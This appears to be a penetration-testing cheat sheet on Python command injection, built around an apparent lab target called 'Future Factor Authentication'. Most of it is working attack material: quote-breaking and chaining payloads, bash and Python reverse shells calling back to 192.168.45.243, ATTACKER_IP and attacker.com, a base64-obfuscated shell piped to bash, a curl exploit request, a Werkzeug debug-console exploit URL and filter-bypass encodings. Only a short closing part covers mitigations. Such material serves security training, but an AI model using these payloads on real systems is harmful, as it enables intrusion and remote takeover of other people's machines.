# Python Command Injection Guide

## Overview
Python applications are particularly susceptible to command injection when using functions like `os.system()`, `os.popen()`, `subprocess.call()` with shell=True, or `eval()` with user input.

---

## Common Vulnerable Functions

### os.popen()
```python
# VULNERABLE CODE (from Future Factor Authentication)
ffa = request.form['ffa']
out = os.popen(f'echo "{ffa}"').read()

# Exploitation:
# Input: "; bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1'; echo "
# Results in: echo ""; bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1'; echo ""
```

### os.system()
```python
# VULNERABLE
user_input = request.args.get('cmd')
os.system(f"ping {user_input}")

# Exploitation:
# Input: 8.8.8.8; whoami
```

### subprocess with shell=True
```python
# VULNERABLE
import subprocess
cmd = f"git clone {user_repo}"
subprocess.call(cmd, shell=True)

# Exploitation:
# Input: https://github.com/test; nc -e /bin/bash attacker.com 4444
```

### eval() and exec()
```python
# VULNERABLE
calculation = request.form['calc']
result = eval(calculation)

# Exploitation:
# Input: __import__('os').system('id')
```

---

## Injection Techniques

### 1. Quote Breaking
```bash
# Original: echo "user_input"
# Payload: "; command; echo "
# Result: echo ""; command; echo ""
```

### 2. Command Substitution
```bash
# Using $()
$(command)

# Using backticks
`command`

# Example payload:
$(bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1')
```

### 3. Command Chaining
```bash
# Semicolon (executes regardless)
; command

# AND operator (executes if first succeeds)
&& command

# OR operator (executes if first fails)
|| command

# Pipe (uses output as input)
| command

# Background execution
& command &
```

### 4. Comment Injection
```bash
# Bash/Python comment
; command #

# SQL-style comment
; command --

# Multi-line comment bypass
"; command; : '
rest gets commented
'
```

---

## Python-Specific Payloads

### Direct Import Execution
```python
# Basic
__import__('os').system('id')

# With subprocess
__import__('subprocess').call(['bash','-c','id'])

# Using eval bypass
eval(compile('import os; os.system("id")', '<string>', 'exec'))
```

### Reverse Shells
```python
# Python reverse shell one-liner
__import__('os').system('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.45.243\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"')

# Using base64 to avoid quotes
__import__('os').system('echo cHl0aG9uIC1jICJpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnMTkyLjE2OC40NS4yNDMnLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWycvYmluL2Jhc2gnLCctaSddKSI= | base64 -d | bash')
```

---

## Detection Patterns

### Code Review Red Flags
```python
# Look for these patterns:
os.system(f"...{user_input}...")
os.popen(f"...{user_input}...")
subprocess.call(user_input, shell=True)
eval(user_input)
exec(user_input)
compile(user_input, ...)
```

### Input Fields to Test
- Forms processing system commands
- Search fields in admin panels
- File operation parameters
- API endpoints accepting commands
- Debug/diagnostic interfaces
- Backup/restore functions

---

## Werkzeug/Flask Specific

### Debug Mode Indicators
```python
# URL patterns
/console
/debug
/_debug

# Headers
Server: Werkzeug/2.x.x
X-Powered-By: Flask

# Error pages showing stack traces
# PIN-protected console access
```

### Exploiting Debug Mode
```python
# If PIN is known/bypassed:
http://target/console?__debugger__=yes&cmd=__import__('os').system('id')&frm=0&s=SECRET

# Triggering errors for source disclosure:
# Send malformed requests
# Missing required parameters
# Invalid data types
```

---

## Filter Bypass Techniques

### Encoding
```python
# URL encoding
%3B%20whoami%20%3B

# Unicode encoding
\u003b\u0020whoami\u0020\u003b

# HTML entities
&#59;&#32;whoami&#32;&#59;

# Base64
echo d2hvYW1p | base64 -d | bash
```

### String Manipulation
```python
# Concatenation
"wh"+"oami"

# Variable substitution
$IFS$9 (acts as space in bash)

# Case manipulation
WhOaMi (Windows)
```

### Alternative Commands
```python
# Instead of 'cat'
more, less, head, tail, strings, xxd

# Instead of 'ls'
dir, find, echo *

# Instead of 'whoami'
id, echo $USER, who am i
```

---

## Mitigation Strategies

### Safe Alternatives
```python
# SAFE: Use subprocess without shell
import subprocess
subprocess.run(["ping", "-c", "4", user_input], check=True)

# SAFE: Use shlex for parsing
import shlex
cmd = shlex.split(f"ping -c 4 {shlex.quote(user_input)}")
subprocess.run(cmd)

# SAFE: Whitelist validation
import re
if re.match(r'^[a-zA-Z0-9\.\-]+$', user_input):
    os.system(f"ping {user_input}")
```

### Input Validation
```python
# Whitelist approach
ALLOWED_COMMANDS = ['status', 'health', 'version']
if user_input in ALLOWED_COMMANDS:
    # Execute predefined functions

# Sanitization
import html
sanitized = html.escape(user_input)

# Parameter binding (for SQL)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

---

## Real-World Example: Future Factor Authentication

### Vulnerable Code
```python
def login():
    if request.method == 'POST':
        ffa = request.form['ffa']
        out = os.popen(f'echo "{ffa}"').read()
```

### Exploitation Steps
1. **Identify injection point**: FFA parameter in POST request
2. **Test basic injection**: `"; whoami; echo "`
3. **Develop payload**: `"; bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1'; echo "`
4. **Execute via curl**:
```bash
curl -X POST http://192.168.229.16/login \
  --data-urlencode "username=test" \
  --data-urlencode "password=test" \
  --data-urlencode "ffa=test\"; bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1'; echo \""
```

### Key Lessons
- Debug mode exposed source code revealing vulnerability
- String concatenation with user input is dangerous
- Quote breaking is effective against echo commands
- Always check for command injection when system commands are referenced

---

## Quick Reference Checklist

### Testing Methodology
1. ✅ Identify command execution references
2. ✅ Test with simple commands (id, whoami)
3. ✅ Try command chaining (;, &&, ||, |)
4. ✅ Attempt quote breaking (", ', `)
5. ✅ Test command substitution ($(), ``)
6. ✅ Try comment injection (#, --, /* */)
7. ✅ Encode payloads if filtered
8. ✅ Escalate to reverse shell
9. ✅ Document working payloads
10. ✅ Check for privilege escalation

### Essential Payloads
```bash
# Linux test
; id ;
"; whoami; echo "
$(whoami)
`id`

# Windows test
& whoami
| whoami
&& whoami

# Reverse shells
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' ;
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' ;
```

---

*Last Updated: Python Command Injection Patterns and Exploitation Techniques*